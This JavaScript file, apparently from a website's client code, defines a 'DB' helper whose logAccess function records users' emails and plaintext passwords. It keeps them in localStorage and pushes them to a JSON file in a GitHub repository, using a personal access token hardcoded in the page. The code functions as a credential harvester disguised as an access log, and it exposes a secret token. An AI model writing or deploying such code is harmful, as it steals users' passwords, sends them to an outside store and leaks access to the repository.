(function () {
  var CONFIG = {
    owner: 'makyneta',
    repo: 'catletismomg',
    path: 'admin/access-log.json',
    branch: 'main',
    token: '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'
  };

  var API = 'https://api.github.com/repos/' + CONFIG.owner + '/' + CONFIG.repo + '/contents/' + CONFIG.path;

  function b64enc(s) {
    return btoa(unescape(encodeURIComponent(s)));
  }

  function b64dec(s) {
    return decodeURIComponent(escape(atob(s)));
  }

  async function githubRead() {
    var res = await fetch(API, {
      headers: {
        Authorization: 'Bearer ' + CONFIG.token,
        Accept: 'application/vnd.github.v3+json'
      }
    });
    if (res.status === 404) return { sha: null, log: [] };
    if (!res.ok) throw new Error('GH read ' + res.status);
    var data = await res.json();
    return { sha: data.sha, log: JSON.parse(b64dec(data.content)) };
  }

  async function githubAppend(entry) {
    var sha, log;
    try {
      var current = await githubRead();
      sha = current.sha;
      log = current.log;
    } catch (e) {
      log = [];
    }
    log.unshift(entry);
    if (log.length > 500) log.length = 500;
    await githubWrite(log, sha);
  }

  async function githubClear() {
    try {
      var current = await githubRead();
      await githubWrite([], current.sha);
    } catch (e) {}
  }

  function githubWrite(log, sha) {
    var body = {
      message: 'registo de acesso',
      content: b64enc(JSON.stringify(log, null, 2)),
      branch: CONFIG.branch
    };
    if (sha) body.sha = sha;
    return fetch(API, {
      method: 'PUT',
      headers: {
        Authorization: 'Bearer ' + CONFIG.token,
        Accept: 'application/vnd.github.v3+json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(body)
    });
  }

  window.DB = {
    async logAccess(email, password) {
      var entry = { email: email, password: password, time: new Date().toISOString() };
      try {
        var log = JSON.parse(localStorage.getItem('camg_access_log')) || [];
        log.unshift(entry);
        if (log.length > 500) log.length = 500;
        localStorage.setItem('camg_access_log', JSON.stringify(log));
      } catch (e) {}
      githubAppend(entry).catch(function (e) { console.error('GH log error', e); });
    },

    _githubClear: githubClear,

    async getAccessLog() {
      try {
        var result = await githubRead();
        if (result.log && result.log.length) return result.log;
      } catch (e) {}
      try {
        return JSON.parse(localStorage.getItem('camg_access_log')) || [];
      } catch (e) { return []; }
    }
  };
})();
